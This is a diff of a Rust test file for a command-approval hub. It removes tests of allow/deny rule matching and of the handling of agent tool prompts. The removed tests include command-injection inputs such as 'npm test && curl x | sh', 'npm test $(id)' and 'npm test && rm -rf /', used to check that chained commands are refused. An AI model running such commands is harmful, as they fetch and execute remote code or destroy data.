@@ -1,118 +1,13 @@
-use super::permissions::*;
 use super::*;
 use crate::hub::store::HubDb;
 use crate::hub::usage::ports::WaitPage;
 use fleetd_contracts::events::HubEvent;
-use fleetd_contracts::sessions::{PendingPermission, PermissionDecision};
 use std::sync::Mutex;
-
-fn rules(allow: &[&str], deny: &[&str]) -> ToolRules {
-    ToolRules {
-        allow: allow.iter().map(|s| s.to_string()).collect(),
-        deny: deny.iter().map(|s| s.to_string()).collect(),
-    }
-}
-
-#[test]
-fn rules_answer_only_what_they_clearly_cover() {
-    let r = rules(
-        &[
-            "Bash(npm test:*)",
-            "Bash(git status)",
-            "Read",
-            "mcp__github",
-            "Bash(cargo * --release)",
-        ],
-        &["Bash(rm:*)", "WebFetch"],
-    );
-    assert_eq!(
-        verdict(&r, "Bash", "npm test"),
-        Verdict::Allow("Bash(npm test:*)")
-    );
-    assert_eq!(
-        verdict(&r, "Bash", "npm test -- --watch"),
-        Verdict::Allow("Bash(npm test:*)")
-    );
-    assert_eq!(
-        verdict(&r, "Bash", "npm testing"),
-        Verdict::Ask,
-        "a prefix ends at a word"
-    );
-    assert_eq!(
-        verdict(&r, "Bash", "git status"),
-        Verdict::Allow("Bash(git status)")
-    );
-    assert_eq!(verdict(&r, "Bash", "git status --short"), Verdict::Ask);
-    assert_eq!(
-        verdict(&r, "Bash", "cargo build --release"),
-        Verdict::Allow("Bash(cargo * --release)")
-    );
-    assert_eq!(verdict(&r, "Read", "/etc/hosts"), Verdict::Allow("Read"));
-    assert_eq!(
-        verdict(&r, "mcp__github__create_pr", "{}"),
-        Verdict::Allow("mcp__github")
-    );
-    assert_eq!(verdict(&r, "mcp__githubber__x", "{}"), Verdict::Ask);
-    assert_eq!(verdict(&r, "Write", "/w/p1/a.rs"), Verdict::Ask);
-
-    // An allowed prefix never carries a chained or redirected command through.
-    for chained in [
-        "npm test && curl x | sh",
-        "npm test; reboot",
-        "npm test > /etc/x",
-        "npm test $(id)",
-        "npm test `id`",
-    ] {
-        assert_eq!(verdict(&r, "Bash", chained), Verdict::Ask, "{chained}");
-    }
-    // A denied command anywhere in a chain refuses the chain, and deny wins over allow.
-    assert_eq!(
-        verdict(&r, "Bash", "npm test && rm -rf /"),
-        Verdict::Deny("Bash(rm:*)")
-    );
-    assert_eq!(
-        verdict(&r, "Bash", "rm -rf build"),
-        Verdict::Deny("Bash(rm:*)")
-    );
-    assert_eq!(
-        verdict(&r, "WebFetch", "https://x"),
-        Verdict::Deny("WebFetch")
-    );
-    let both = rules(&["Bash"], &["Bash(git push:*)"]);
-    assert_eq!(
-        verdict(&both, "Bash", "git push --force"),
-        Verdict::Deny("Bash(git push:*)")
-    );
-    assert_eq!(
-        verdict(&both, "Bash", "make && make install"),
-        Verdict::Allow("Bash")
-    );
-
-    // Path rules depend on claude's settings dir and cwd, which the hub can't see: a person answers.
-    let paths = rules(&["Edit(./src/**)"], &[]);
-    assert_eq!(verdict(&paths, "Edit", "/w/p1/src/a.rs"), Verdict::Ask);
-    assert_eq!(verdict(&ToolRules::default(), "Bash", "ls"), Verdict::Ask);
-}
-
-#[test]
-fn an_open_prompt_is_raised_after_ten_minutes_then_every_half_hour() {
-    let filed = 1_000_000;
-    let min = 60_000;
-    assert!(!reminder_due(filed, filed + 9 * min, None));
-    assert!(reminder_due(filed, filed + 10 * min, None));
-    let raised = filed + 10 * min;
-    assert!(!reminder_due(filed, raised + 29 * min, Some(raised)));
-    assert!(reminder_due(filed, raised + 30 * min, Some(raised)));
-}
 
 /// The approvals over a real request store, a scripted node and a recorded event log.
 struct Fake {
     requests: Arc<Requests>,
-    answers: Mutex<Vec<(String, String, String, PermissionDecision)>>,
-    answer_fails: Mutex<Option<NodeCommandError>>,
-    pending: Mutex<Option<PendingPermission>>,
     linked: Mutex<bool>,
-    rules: Mutex<Result<ToolRules, String>>,
     events: Mutex<Vec<NewEvent>>,
     /// Each lead wake: `<requestId> <state>`.
     woken: Mutex<Vec<String>>,
@@ -128,11 +23,7 @@ impl Default for Fake {
     fn default() -> Self {
         Self {
             requests: Requests::new(HubDb::open_memory().unwrap()),
-            answers: Mutex::default(),
-            answer_fails: Mutex::default(),
-            pending: Mutex::default(),
             linked: Mutex::new(false),
-            rules: Mutex::new(Ok(ToolRules::default())),
             events: Mutex::default(),
             woken: Mutex::default(),
             woke: tokio::sync::Notify::new(),
@@ -157,46 +48,25 @@ impl Fake {
     fn request(&self, id: &str) -> HumanRequest {
         self.requests.get(id).unwrap().unwrap()
     }
-    fn reminders(&self) -> Vec<NewEvent> {
-        self.events
-            .lock()
-            .unwrap()
-            .iter()
-            .filter(|e| e.kind == "thread.waiting")
-            .cloned()
-            .collect()
-    }
-    /// Stores a request in `state` as an earlier hub left it.
-    fn stored(
-        &self,
-        permission: Option<(&str, &str)>,
-        state: RequestState,
-        evidence: Option<&str>,
-    ) -> HumanRequest {
-        let r = self
-            .requests
+    /// Stores an open command approval.
+    fn stored(&self) -> HumanRequest {
+        self.requests
             .create(NewRequest {
-                project_ref: serde_json::from_value(json!({ "machineId": "lab-a", "projectId": "p1" })).unwrap(),
+                project_ref: serde_json::from_value(
+                    json!({ "machineId": "lab-a", "projectId": "p1" }),
+                )
+                .unwrap(),
                 workstream_id: None,
                 kind: RequestKind::Approval,
-                text: "lab-a/t1: Bash ls".into(),
+                text: "lab-a: ls".into(),
                 secret: None,
-                gated: None,
-                permission: permission.map(|(thread, request)| {
-                    serde_json::from_value(json!({ "threadId": thread, "requestId": request, "toolName": "Bash", "summary": "ls" }))
-                        .unwrap()
-                }),
+                gated: Some(
+                    serde_json::from_value(json!({ "argv": ["ls"], "cwd": "/w/p1", "class": "irreversible", "reason": "look", "timeoutSec": 60 }))
+                        .unwrap(),
+                ),
+                permission: None,
                 at: fleetd_contracts::ids::Timestamp("2026-10-18T10:00:00.000Z".into()),
                 at_ms: 0,
-            })
-            .unwrap();
-        self.requests
-            .update(&r.request_id, |r| {
-                r.state = state;
-                r.evidence = evidence.map(fleetd_contracts::prim::Text::unchecked);
-                if state != RequestState::Open {
-                    r.answered_by = Some("human:desk".into());
-                }
             })
             .unwrap()
     }
@@ -225,35 +95,9 @@ impl ApprovalNodes for Fake {
         let reply = self.gated_reply.lock().unwrap().clone();
         Box::pin(async move { reply })
     }
-    fn answer_permission(
-        &self,
-        m: &str,
-        t: &str,
-        request_id: &str,
-        decision: PermissionDecision,
-        _by: Option<fleetd_contracts::time::DecidedBy>,
-    ) -> BoxFut<'_, Result<(), NodeCommandError>> {
-        let result = match self.answer_fails.lock().unwrap().clone() {
-            Some(e) => Err(e),
-            None => {
-                self.answers.lock().unwrap().push((
-                    m.into(),
-                    t.into(),
-                    request_id.into(),
-                    decision,
-                ));
-                Ok(())
-            }
-        };
-        Box::pin(async move { result })
-    }
     fn is_linked(&self, _: &str) -> BoxFut<'_, bool> {
         let l = *self.linked.lock().unwrap();
         Box::pin(async move { l })
-    }
-    fn pending_permission(&self, _: &str, _: &str) -> BoxFut<'_, Option<PendingPermission>> {
-        let p = self.pending.lock().unwrap().clone();
-        Box::pin(async move { p })
     }
 }
 
@@ -272,13 +116,6 @@ impl ApprovalHub for Fake {
             .push(format!("{} {}", r.request_id, r.state.as_str()));
         self.woke.notify_one();
         Box::pin(async {})
-    }
-    fn tool_rules(&self, _: &ProjectRef) -> BoxFut<'_, Result<ToolRules, String>> {
-        let r = self.rules.lock().unwrap().clone();
-        Box::pin(async move { r })
-    }
-    fn prompts(&self, _: &str, _: &str) -> crate::hub::prompts::PromptSet {
-        crate::hub::prompts::PromptSet::defaults().clone()
     }
 }
 
@@ -309,26 +146,6 @@ fn approvals(fake: &Arc<Fake>) -> Arc<Approvals> {
         events: fake.clone(),
         clock: Arc::new(crate::clock::SystemClock),
     })
-}
-
-fn prompt(request_id: &str, tool: &str, summary: &str) -> Value {
-    json!({ "requestId": request_id, "toolName": tool, "summary": summary })
-}
-
-fn event(kind: &str, permission: Option<Value>) -> HubEvent {
-    let mut data = json!({ "status": "waiting" });
-    if let Some(p) = permission {
-        data["permission"] = p;
-    }
-    serde_json::from_value(json!({
-        "seq": 7, "at": "2026-10-18T10:00:00.000Z", "type": kind, "machineId": "lab-a", "projectId": "p1",
-        "threadId": "t1", "summary": "", "data": data,
-    }))
-    .unwrap()
-}
-
-fn pending(request_id: &str) -> PendingPermission {
-    serde_json::from_value(prompt(request_id, "Bash", "rm -rf build")).unwrap()
 }
 
 fn p1() -> ProjectRef {
@@ -636,335 +453,6 @@ async fn after_a_restart_an_approved_command_goes_back_to_the_person_and_never_r
     assert!(fake.runs.lock().unwrap().is_empty());
 }
 
-#[tokio::test]
-async fn a_prompt_no_rule_covers_becomes_one_approval_and_approve_allows_it_on_the_node() {
-    let fake = Arc::new(Fake::default());
-    let a = approvals(&fake);
-    let waiting = event("thread.waiting", Some(prompt("q1", "Bash", "rm -rf build")));
-    a.on_thread_event(&waiting).await;
-    a.on_thread_event(&waiting).await;
-    let open = fake
-        .requests
-        .list(&RequestFilter {
-            limit: 10,
-            ..Default::default()
-        })
-        .unwrap();
-    assert_eq!(open.len(), 1, "the same prompt is filed once");
-    let r = &open[0];
-    assert_eq!(
-        (r.kind, r.text.as_str()),
-        (RequestKind::Approval, "lab-a/t1: Bash rm -rf build")
-    );
-    assert_eq!(
-        serde_json::to_value(&r.permission).unwrap(),
-        json!({ "threadId": "t1", "requestId": "q1", "toolName": "Bash", "summary": "rm -rf build" })
-    );
-    assert!(
-        fake.answers.lock().unwrap().is_empty(),
-        "nothing is answered for the person"
-    );
-
-    a.answer(&person(), "Q1", true, None).await.unwrap();
-    assert_eq!(
-        fake.answers.lock().unwrap().as_slice(),
-        [(
-            "lab-a".into(),
-            "t1".into(),
-            "q1".into(),
-            PermissionDecision::Allow {
-                updated_input: None
-            }
-        )]
-    );
-    assert_eq!(
-        fake.request("Q1").evidence.unwrap().as_str(),
-        "allowed on lab-a, answered by human:desk"
-    );
-    assert_eq!(
-        fake.woken.lock().unwrap().as_slice(),
-        ["Q1 approved"],
-        "the approval reaches the lead"
-    );
-    assert!(
-        fake.runs.lock().unwrap().is_empty(),
-        "a tool prompt never runs a gated command"
-    );
-}
-
-#[tokio::test]
-async fn deny_gives_the_run_the_persons_words_and_an_undelivered_approve_goes_back_to_the_person() {
-    let fake = Arc::new(Fake::default());
-    let a = approvals(&fake);
-    a.on_thread_event(&event(
-        "thread.waiting",
-        Some(prompt("q1", "Bash", "rm -rf build")),
-    ))
-    .await;
-    a.answer(
-        &person(),
-        "Q1",
-        false,
-        Some("use make clean instead".into()),
-    )
-    .await
-    .unwrap();
-    let (_, _, _, decision) = fake.answers.lock().unwrap()[0].clone();
-    assert_eq!(
-        decision,
-        PermissionDecision::Deny {
-            message: fleetd_contracts::prim::Text::unchecked(
-                "Denied: human:desk said no (Q1): use make clean instead. Don't retry this call; ask for another way."
-            )
-        }
-    );
-    assert!(
-        fake.woken.lock().unwrap().is_empty(),
-        "the run itself hears the no"
-    );
-
-    a.on_thread_event(&event(
-        "thread.waiting",
-        Some(prompt("q2", "Bash", "rm -rf dist")),
-    ))
-    .await;
-    // The node is offline while the run still waits: nothing is lost, the person approves again.
-    *fake.answer_fails.lock().unwrap() = Some(NodeCommandError {
-        reason: "offline".into(),
-        message: "lab-a's node is not linked to the hub".into(),
-        fix: None,
-    });
-    a.answer(&person(), "Q2", true, None).await.unwrap();
-    let back = fake.request("Q2");
-    assert_eq!(back.state, RequestState::Open);
-    assert!(
-        back.evidence
-            .unwrap()
-            .as_str()
-            .starts_with("not delivered: lab-a's node is not linked")
-    );
-}
-
-#[tokio::test]
-async fn rules_answer_without_a_request_and_a_broken_policy_asks_a_person() {
-    let fake = Arc::new(Fake {
-        rules: Mutex::new(Ok(rules(&["Bash(npm test:*)"], &["Bash(rm:*)"]))),
-        ..Default::default()
-    });
-    let a = approvals(&fake);
-    let filed = || {
-        fake.requests
-            .list(&RequestFilter {
-                limit: 10,
-                ..Default::default()
-            })
-            .unwrap()
-            .len()
-    };
-    a.on_thread_event(&event(
-        "thread.waiting",
-        Some(prompt("q1", "Bash", "npm test")),
-    ))
-    .await;
-    a.on_thread_event(&event(
-        "thread.waiting",
-        Some(prompt("q2", "Bash", "rm -rf build")),
-    ))
-    .await;
-    let answers = fake.answers.lock().unwrap().clone();
-    assert_eq!(
-        answers[0].3,
-        PermissionDecision::Allow {
-            updated_input: None
-        }
-    );
-    assert_eq!(
-        answers[1].3,
-        PermissionDecision::Deny {
-            message: fleetd_contracts::prim::Text::unchecked(
-                "Denied: the tools.deny rule `Bash(rm:*)` in .fleetd/policy.yaml. Don't retry this call; ask for another way."
-            )
-        }
-    );
-    assert_eq!(filed(), 0);
-
-    *fake.rules.lock().unwrap() = Err(".fleetd/policy.yaml is invalid".into());
-    a.on_thread_event(&event(
-        "thread.waiting",
-        Some(prompt("q3", "Bash", "npm test")),
-    ))
-    .await;
-    assert_eq!(filed(), 1, "a broken policy never answers for a person");
-
-    // A rule answer the node refuses still reaches a person.
-    *fake.rules.lock().unwrap() = Ok(rules(&["Bash"], &[]));
-    *fake.answer_fails.lock().unwrap() = Some(NodeCommandError {
-        reason: "failed".into(),
-        message: "x".into(),
-        fix: None,
-    });
-    a.on_thread_event(&event("thread.waiting", Some(prompt("q4", "Bash", "ls"))))
-        .await;
-    assert_eq!(filed(), 2);
-}
-
-#[tokio::test]
-async fn an_approval_closes_when_its_prompt_is_gone() {
-    let fake = Arc::new(Fake::default());
-    let a = approvals(&fake);
-    a.on_thread_event(&event("thread.waiting", Some(prompt("q1", "Bash", "ls"))))
-        .await;
-    // A second prompt in the same run: the first was answered some other way.
-    a.on_thread_event(&event("thread.waiting", Some(prompt("q2", "Bash", "pwd"))))
-        .await;
-    a.on_thread_event(&event("thread.failed", None)).await;
-    let states: Vec<_> = ["Q1", "Q2"]
-        .iter()
-        .map(|id| {
-            let r = fake.request(id);
-            (r.state, r.evidence.unwrap().to_string())
-        })
-        .collect();
-    assert_eq!(
-        states,
-        [
-            (
-                RequestState::Denied,
-                "closed: the prompt was answered elsewhere".to_string()
-            ),
-            (RequestState::Denied, "expired: the run ended".to_string()),
-        ]
-    );
-    // A reminder is the hub's own event, never a new prompt.
-    let mut reminder = event("thread.waiting", Some(prompt("q9", "Bash", "ls")));
-    reminder.data.as_mut().unwrap()["reminder"] = json!(true);
-    a.on_thread_event(&reminder).await;
-    assert!(fake.requests.get("Q3").unwrap().is_none());
-}
-
-fn now_ms() -> i64 {
-    crate::hub::store::system_ms(std::time::SystemTime::now())
-}
-
-#[tokio::test]
-async fn a_withdrawn_approval_denies_its_prompt_and_reminders_go_on_until_it_lands() {
-    let fake = Arc::new(Fake::default());
-    let a = approvals(&fake);
-    a.on_thread_event(&event(
-        "thread.waiting",
-        Some(prompt("q1", "Bash", "rm -rf build")),
-    ))
-    .await;
-    *fake.pending.lock().unwrap() = Some(pending("q1"));
-    *fake.answer_fails.lock().unwrap() = Some(NodeCommandError {
-        reason: "offline".into(),
-        message: "lab-a's node is not linked to the hub".into(),
-        fix: None,
-    });
-    a.withdraw(&p1(), "lead:lab-a/p1", "Q1").await.unwrap();
-    let t0 = now_ms();
-    a.sweep_prompts(t0).await;
-    assert_eq!(
-        a.prompts.len(),
-        1,
-        "an undelivered deny keeps the prompt watched"
-    );
-    a.sweep_prompts(t0 + REMIND_AFTER_MS + 1000).await;
-    let reminders = fake.reminders();
-    assert_eq!(reminders.len(), 1);
-    assert_eq!(reminders[0].attention.as_deref(), Some("loud"));
-
-    *fake.answer_fails.lock().unwrap() = None;
-    a.sweep_prompts(t0 + REMIND_AFTER_MS + 2000).await;
-    let (_, _, request, decision) = fake.answers.lock().unwrap()[0].clone();
-    assert_eq!(request, "q1");
-    let PermissionDecision::Deny { message } = decision else {
-        panic!("a withdrawn approval never allows")
-    };
-    assert!(
-        message
-            .as_str()
-            .starts_with("Denied: lead:lab-a/p1 withdrew Q1 before anyone answered it"),
-        "{}",
-        message.as_str()
-    );
-    assert_eq!(
-        fake.request("Q1").evidence.unwrap().as_str(),
-        "denied on lab-a, answered by lead:lab-a/p1"
-    );
-    assert_eq!(a.prompts.len(), 0);
-    a.sweep_prompts(t0 + 10 * REMIND_EVERY_MS).await;
-    assert_eq!(fake.reminders().len(), 1, "nothing left to remind about");
-    assert_eq!(fake.answers.lock().unwrap().len(), 1);
-}
-
-#[tokio::test]
-async fn after_a_restart_an_answer_with_no_delivery_record_is_delivered() {
-    let fake = Arc::new(Fake::default());
-    fake.stored(Some(("t1", "q1")), RequestState::Approved, None);
-    fake.stored(
-        Some(("t1", "q2")),
-        RequestState::Approved,
-        Some("allowed on lab-a, answered by human:desk"),
-    );
-    let a = approvals(&fake);
-    a.seed_prompts().await;
-    a.sweep_prompts(now_ms()).await;
-    let answers = fake.answers.lock().unwrap().clone();
-    assert_eq!(answers.len(), 1, "a delivered answer is never sent twice");
-    assert_eq!(
-        (answers[0].2.as_str(), &answers[0].3),
-        (
-            "q1",
-            &PermissionDecision::Allow {
-                updated_input: None
-            }
-        )
-    );
-    assert_eq!(
-        fake.request("Q1").evidence.unwrap().as_str(),
-        "allowed on lab-a, answered by human:desk"
-    );
-}
-
-#[tokio::test]
-async fn a_prompt_whose_run_ended_while_the_hub_was_down_closes_quietly() {
-    let fake = Arc::new(Fake::default());
-    fake.stored(Some(("t1", "q1")), RequestState::Open, None);
-    let a = approvals(&fake);
-    a.seed_prompts().await;
-    let late = now_ms();
-    // Offline: the hub can't tell, so it keeps reminding.
-    a.sweep_prompts(late).await;
-    a.sweep_prompts(late + 1).await;
-    assert_eq!(a.prompts.len(), 1);
-    assert_eq!(fake.reminders().len(), 1, "an old prompt is reminded about");
-    // Linked, and the node's snapshot shows another prompt (or none): once is not enough, twice closes it.
-    *fake.linked.lock().unwrap() = true;
-    *fake.pending.lock().unwrap() = Some(pending("q7"));
-    a.sweep_prompts(late + 2).await;
-    assert_eq!(a.prompts.len(), 1);
-    a.sweep_prompts(late + 60_000).await;
-    assert_eq!(a.prompts.len(), 0);
-    let r = fake.request("Q1");
-    assert_eq!(
-        (r.state, r.evidence.unwrap().as_str()),
-        (
-            RequestState::Denied,
-            "expired: the run ended while the hub was down"
-        )
-    );
-    assert_eq!(
-        fake.reminders().len(),
-        1,
-        "closed quietly: no further reminder"
-    );
-    assert!(
-        fake.answers.lock().unwrap().is_empty(),
-        "nothing is sent to the node"
-    );
-}
-
 /// Two people answer the same approval at once: exactly one answer counts, and the command runs once.
 #[tokio::test(flavor = "multi_thread", worker_threads = 4)]
 async fn two_answers_at_once_run_the_command_once() {
@@ -1035,7 +523,7 @@ async fn an_approve_racing_a_deny_never_ends_denied_after_running() {
 #[test]
 fn only_one_guarded_write_moves_a_request() {
     let fake = Fake::default();
-    let r = fake.stored(Some(("t1", "q1")), RequestState::Open, None);
+    let r = fake.stored();
     let requests = fake.requests.clone();
     let won: usize = std::thread::scope(|s| {
         let handles: Vec<_> = (0..8)
